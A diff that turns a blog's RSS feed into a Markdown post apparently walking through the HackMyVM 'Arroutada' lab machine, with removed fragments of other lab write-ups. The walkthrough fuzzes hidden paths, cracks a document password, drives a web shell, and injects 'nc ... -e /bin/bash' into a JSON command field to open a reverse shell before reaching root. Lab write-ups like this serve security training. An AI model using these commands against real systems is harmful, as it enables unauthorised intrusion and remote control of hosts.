@@ -1,5 +1,4 @@
-<?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Blog Title</title><link>https://7r1UMPH.github.io</link><description>Blog description</description><copyright>Blog Title</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Thu, 20 Mar 2025 07:53:47 +0000</lastBuildDate><managingEditor>Blog Title</managingEditor><ttl>60</ttl><webMaster>Blog Title</webMaster><item><title>hmv_Arroutada</title><link>https://7r1UMPH.github.io/post/hmv_Arroutada.html</link><description># hmv_Arroutada
+# hmv_Arroutada
 
 # 0.简介
 
@@ -44,7 +43,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
 ```
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.151
-&lt;div align='center'&gt;&lt;img src='imgs/apreton.png'&gt;&lt;/div&gt;
+<div align="center"><img src="imgs/apreton.png"></div>
 
 ```
 
@@ -52,10 +51,10 @@ Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
 
 ```
 ┌──(kali㉿kali)-[~/test]
-└─$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
+└─$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
 ===============================================================
 Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:                     http://192.168.205.151
 [+] Method:                  GET
@@ -70,8 +69,8 @@ Starting gobuster in directory enumeration mode
 ===============================================================
 /index.html           (Status: 200) [Size: 59]
 /.                    (Status: 200) [Size: 59]
-/imgs                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.151/imgs/]
-/scout                (Status: 301) [Size: 318] [--&gt; http://192.168.205.151/scout/]
+/imgs                 (Status: 301) [Size: 317] [--> http://192.168.205.151/imgs/]
+/scout                (Status: 301) [Size: 318] [--> http://192.168.205.151/scout/]
 Progress: 598000 / 598005 (100.00%)
 ===============================================================                                                                      
 Finished
@@ -85,22 +84,22 @@ Finished
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.151/scout/
 
-&lt;div&gt;
-&lt;p&gt;
+<div>
+<p>
 Hi, Telly,
-&lt;br&gt;
-&lt;br&gt;
+<br>
+<br>
 I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
-&lt;br&gt;
+<br>
 /scout/******/docs/
-&lt;br&gt;
-&lt;br&gt;
+<br>
+<br>
 With continued gratitude,
-&lt;br&gt;
+<br>
 J1.
-&lt;/p&gt;
-&lt;/div&gt;
-&lt;!-- Stop please --&gt;
+</p>
+</div>
+<!-- Stop please -->
 
 ```
 
@@ -108,7 +107,7 @@ J1.
 
 ```
 ┌──(kali㉿kali)-[~/test]
-└─$ wfuzz -u '192.168.205.151/scout/FUZZ/docs/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 
+└─$ wfuzz -u "192.168.205.151/scout/FUZZ/docs/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -121,7 +120,7 @@ Total requests: 119600
 ID           Response   Lines    Word       Chars       Payload                                                             
 =====================================================================
 
-000021664:   200        1016 L   12059 W    189769 Ch   'j2'                                                                
+000021664:   200        1016 L   12059 W    189769 Ch   "j2"                                                                
 
 Total time: 59.22016
 Processed Requests: 119600
@@ -148,7 +147,7 @@ Will run 12 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 john11           (shellfile.ods)   
 1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
-Use the '--show --format=ODF' options to display all of the cracked passwords reliably
+Use the "--show --format=ODF" options to display all of the cracked passwords reliably
 Session completed. 
 
 ```
@@ -157,7 +156,7 @@ Session completed.
 
 ```
 ┌──(kali㉿kali)-[~/test]
-└─$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 
+└─$ wfuzz -u "http://192.168.205.151/thejabasshell.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -170,8 +169,8 @@ Total requests: 119600
 ID           Response   Lines    Word       Chars       Payload                                                             
 =====================================================================
 
-000000280:   200        0 L      5 W        33 Ch       'a'                                                                 
-000000557:   200        0 L      0 W        0 Ch        'Controls'                                                          
+000000280:   200        0 L      5 W        33 Ch       "a"                                                                 
+000000557:   200        0 L      0 W        0 Ch        "Controls"                                                          
 
 Total time: 0
 Processed Requests: 474
@@ -180,27 +179,27 @@ Requests/sec.: 0
 
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.151/thejabasshell.php?a=id
-Error: Problem with parameter 'b'                                                                                                                                
+Error: Problem with parameter "b"                                                                                                                                
 ```
 
 还要一个b的参数
 
 ```
 ┌──(kali㉿kali)-[~/test]
-└─$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5
+└─$ wfuzz -u "http://192.168.205.151/thejabasshell.php?a=id&b=FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ
+Target: http://192.168.205.151/thejabasshell.php?a=id&b=FUZZ
 Total requests: 119600
 
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                             
 =====================================================================
 
-000001999:   200        1 L      3 W        54 Ch       'pass'                                                              
+000001999:   200        1 L      3 W        54 Ch       "pass"                                                              
  /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
 
 Total time: 41.29983
@@ -209,7 +208,7 @@ Filtered Requests: 56689
 Requests/sec.: 1372.644
 
 ┌──(kali㉿kali)-[~/test]
-└─$ curl 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=pass'
+└─$ curl "http://192.168.205.151/thejabasshell.php?a=id&b=pass"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
                         
 ```
@@ -268,11 +267,11 @@ drwxr-xr-x  2 root root  4096 Sep  3  2022 backups
 drwxr-xr-x 10 root root  4096 Jan  8  2023 cache
 drwxr-xr-x 26 root root  4096 Jan  8  2023 lib
 drwxrwsr-x  2 root staff 4096 Sep  3  2022 local
-lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -&gt; /run/lock
+lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -> /run/lock
 drwxr-xr-x  8 root root  4096 Jan  8  2023 log
 drwxrwsr-x  2 root mail  4096 Jan  8  2023 mail
 drwxr-xr-x  2 root root  4096 Jan  8  2023 opt
-lrwxrwxrwx  1 root root     4 Jan  8  2023 run -&gt; /run
+lrwxrwxrwx  1 root root     4 Jan  8  2023 run -> /run
 drwxr-xr-x  4 root root  4096 Jan  8  2023 spool
 drwxrwxrwt  2 root root  4096 Feb  8 03:46 tmp
 drwxr-xr-x  3 root root  4096 Jan  8  2023 www
@@ -299,17 +298,17 @@ www-data@arroutada:/$ ls -la
 total 68
 drwxr-xr-x  18 root root  4096 Jan  8  2023 .
 drwxr-xr-x  18 root root  4096 Jan  8  2023 ..
-lrwxrwxrwx   1 root root     7 Jan  8  2023 bin -&gt; usr/bin
+lrwxrwxrwx   1 root root     7 Jan  8  2023 bin -> usr/bin
 drwxr-xr-x   3 root root  4096 Jan  8  2023 boot
 drwxr-xr-x  17 root root  3140 Feb  8 03:46 dev
 drwxr-xr-x  66 root root  4096 Feb  8 03:46 etc
 drwxr-xr-x   3 root root  4096 Jan  8  2023 home
-lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -&gt; boot/initrd.img-5.10.0-20-amd64
-lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
-lrwxrwxrwx   1 root root     7 Jan  8  2023 lib -&gt; usr/lib
-lrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -&gt; usr/lib32
-lrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -&gt; usr/lib64
-lrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -&gt; usr/libx32
+lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -> boot/initrd.img-5.10.0-20-amd64
+lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
+lrwxrwxrwx   1 root root     7 Jan  8  2023 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -> usr/libx32
 drwx------   2 root root 16384 Jan  8  2023 lost+found
 drwxr-xr-x   3 root root  4096 Jan  8  2023 media
 drwxr-xr-x   2 root root  4096 Jan  8  2023 mnt
@@ -317,15 +316,15 @@ drwxr-xr-x   2 root root  4096 Jan  8  2023 opt
 dr-xr-xr-x 150 root root     0 Feb  8 03:46 proc
 drwx------   3 root root  4096 Jan  8  2023 root
 drwxr-xr-x  17 root root   480 Feb  8 03:46 run
-lrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -&gt; usr/sbin
+lrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -> usr/sbin
 drwxr-xr-x   2 root root  4096 Jan  8  2023 srv
 dr-xr-xr-x  13 root root     0 Feb  8 03:46 sys
 drwxrwxrwt   2 root root  4096 Feb  8 03:46 tmp
 drwxr-xr-x  14 root root  4096 Jan  8  2023 usr
 drwxr-xr-x  12 root root  4096 Jan  8  2023 var
-lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-20-amd64
-lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
-www-data@arroutada:/$ find / -perm -4000 -type f 2&gt;/dev/null
+lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -> boot/vmlinuz-5.10.0-20-amd64
+lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
+www-data@arroutada:/$ find / -perm -4000 -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/bin/sudo
 /usr/bin/newgrp
@@ -336,7 +335,7 @@ www-data@arroutada:/$ find / -perm -4000 -type f 2&gt;/dev/null
 /usr/bin/mount
 /usr/bin/chfn
 /usr/bin/chsh
-www-data@arroutada:/$ /sbin/getcap -r / 2&gt;/dev/null
+www-data@arroutada:/$ /sbin/getcap -r / 2>/dev/null
 /usr/bin/ping cap_net_raw=ep
 www-data@arroutada:/$ ss -tnlup
 Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
@@ -357,7 +356,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 319 [text/html]
 Saving to: 'index.html'
 
-index.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================&gt;]     319  --.-KB/s    in 0s    
+index.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================>]     319  --.-KB/s    in 0s    
 
 2025-02-08 04:00:55 (116 MB/s) - 'index.html' saved [319/319]
 
@@ -368,15 +367,15 @@ drwxr-xr-x 18 root     root       4096 Jan  8  2023 ..
 -rw-r--r--  1 www-data www-data    319 Feb  8 04:00 index.html
 -rwxr-xr-x  1 www-data www-data 473256 Jan 29 19:48 socat
 www-data@arroutada:/tmp$ cat index.html 
-&lt;h1&gt;Service under maintenance&lt;/h1&gt;
+<h1>Service under maintenance</h1>
 
 
-&lt;br&gt;
+<br>
 
 
-&lt;h6&gt;This site is from ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.+++++++++++..&lt;&lt;++.&gt;++.&gt;-----------.++.++++++++.&lt;+++++.&gt;++++++++++++++.&lt;+++++++++.---------.&lt;.&gt;&gt;-----------------.-------.++.++++++++.------.+++++++++++++.+.&lt;&lt;+..&lt;/h6&gt;
+<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>
 
-&lt;!-- Please sanitize /priv.php --&gt;
+<!-- Please sanitize /priv.php -->
 
 ```
 
@@ -392,12 +391,12 @@ HTTP request sent, awaiting response... 200 OK
 Length: unspecified [text/html]
 Saving to: 'priv.php'
 
-priv.php                                                       [&lt;=&gt;                                                                    priv.php                                                       [ &lt;=&gt;                                                                                                                                     ]     308  --.-KB/s    in 0s    
+priv.php                                                       [<=>                                                                    priv.php                                                       [ <=>                                                                                                                                     ]     308  --.-KB/s    in 0s    
 
 2025-02-08 04:01:52 (111 MB/s) - 'priv.php' saved [308]
 
 www-data@arroutada:/tmp$ cat priv.php 
-Error: the 'command' parameter is not specified in the request body.
+Error: the "command" parameter is not specified in the request body.
 
 /*
 
@@ -407,7 +406,7 @@ $data = json_decode($json, true);
 if (isset($data['command'])) {
     system($data['command']);
 } else {
-    echo 'Error: the 'command' parameter is not specified in the request body.';
+    echo 'Error: the "command" parameter is not specified in the request body.';
 }
 
 */
@@ -417,7 +416,7 @@ if (isset($data['command'])) {
 说我们少了参数，我们加上就好了
 
 ```
-www-data@arroutada:/tmp$ wget --post-data='{'command':'whoami'}' http://127.0.0.1:8000/priv.php -q -O -
+www-data@arroutada:/tmp$ wget --post-data='{"command":"whoami"}' http://127.0.0.1:8000/priv.php -q -O -
 drito
 
 
@@ -429,7 +428,7 @@ $data = json_decode($json, true);
 if (isset($data['command'])) {
     system($data['command']);
 } else {
-    echo 'Error: the 'command' parameter is not specified in the request body.';
+    echo 'Error: the "command" parameter is not specified in the request body.';
 }
 
 */
@@ -439,7 +438,7 @@ if (isset($data['command'])) {
 利用
 
 ```
-www-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -
+www-data@arroutada:/tmp$ wget --post-data='{"command":"nc 192.168.205.128 8888 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -q -O -
 ```
 
 ```
@@ -485,130 +484,4 @@ root@arroutada:/home/drito/web# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-‍。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Arroutada.html</guid><pubDate>Thu, 20 Mar 2025 07:53:18 +0000</pubDate></item><item><title>hmv_Apaches</title><link>https://7r1UMPH.github.io/post/hmv_Apaches.html</link><description># hmv_Apaches
-
-# 0. 简介
-
-**靶机**：[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
-**难度**：绿色
-**目标 IP**：192.168.205.143
-**本机 IP**：192.168.205.141
-
-# 1. 扫描
-
-首先，通过 `nmap` 对靶机进行全端口扫描，检查开放端口和服务：
-
-```bash
-┌──(kali㉿kali)-[~/test]
-└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
-Nmap scan report for 192.168.205.143
-Host is up (0.00024s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-```
-
-从扫描结果可以看到，靶机开启了 **SSH** 和 **HTTP** 服务。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Apaches.html</guid><pubDate>Thu, 20 Mar 2025 07:52:16 +0000</pubDate></item><item><title>hmv_airbind</title><link>https://7r1UMPH.github.io/post/hmv_airbind.html</link><description># hmv_airbind
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=airbind
-**难度**：黄色
-**目标 IP**：192.168.205.212
-**本机** IP：192.168.205.141
-
----
-
-### **1. 端口枚举及服务探测**
-
-首先，使用 `nmap` 扫描目标 IP 的开放端口：
-
-```bash
-┌──(kali㉿kali)-[~/test]
-└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST
-Nmap scan report for 192.168.205.212
-Host is up (0.00029s latency).
-Not shown: 65533 closed tcp ports (conn-refused)
-PORT   STATE    SERVICE VERSION
-22/tcp filtered ssh
-80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
-MAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800
-OS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%
-OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
-OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
-OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F
-OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R
-OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=
-OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
-OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
-OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
-OS:R=Y%DFI=N%T=40%CD=S)
-
-Network Distance: 1 hop
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
-```
-
-扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_airbind.html</guid><pubDate>Thu, 20 Mar 2025 07:51:14 +0000</pubDate></item><item><title>新年快乐！</title><link>https://7r1UMPH.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</link><description># 新年快乐！
-
-新的一年，愿你如东风破浪，事业蒸蒸日上，生活美满如意。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</guid><pubDate>Thu, 20 Mar 2025 07:50:13 +0000</pubDate></item><item><title>群主题</title><link>https://7r1UMPH.github.io/post/qun-zhu-ti.html</link><description># 群主题
-
-好久没打过靶机了，也没更新过，今天在群里看到了群主发了一个题目就玩了一下，顺便水一期wp
-
-题目：
-
-![image](assets/image-20250228232434-jasrmaw.png)
-
-```
-PATH=/usr/bin
-read INPUT &lt; &lt;(head -n1 | tr -d '[A-Za-z0-9/]')
-eval '$INPUT'
-```
-
-浅瞄了一眼，发现`tr`​删除了所有字母、数字和斜杠，但保留特殊符号，那就有搞头
-
-ps:`$@`​ 在 Shell 中表示脚本的所有参数，可被 `eval`​ 解析。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/qun-zhu-ti.html</guid><pubDate>Thu, 20 Mar 2025 07:49:11 +0000</pubDate></item><item><title>模板</title><link>https://7r1UMPH.github.io/post/mo-ban.html</link><description># 模板
-
-# 0.简介
-
-**靶机**：  
-**难度**：绿色  
-**目标 IP**：192.168.205.129  
-**本机 IP**：192.168.205.128
-
-# 1.扫描
-
-​`nmap`​起手
-
-# 2.踩点
-
-# 3. 获得稳定的 Shell
-
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
-
-```bash
-script /dev/null -c bash  
-ctrl+z  
-stty raw -echo; fg  
-reset xterm  
-export TERM=xterm  
-echo $SHELL  
-export SHELL=/bin/bash  
-stty rows 59 cols 236
-```
-
-# 4.提权
-
 ‍
-
-‍。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/mo-ban.html</guid><pubDate>Thu, 20 Mar 2025 07:48:09 +0000</pubDate></item><item><title>摸鱼</title><link>https://7r1UMPH.github.io/post/mo-yu.html</link><description># 摸鱼
-
-过年了，歇几天
-
-![Image](https://github.com/user-attachments/assets/c5154a65-21eb-4886-8298-9622caf68d90)。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/mo-yu.html</guid><pubDate>Thu, 20 Mar 2025 07:47:08 +0000</pubDate></item></channel></rss>
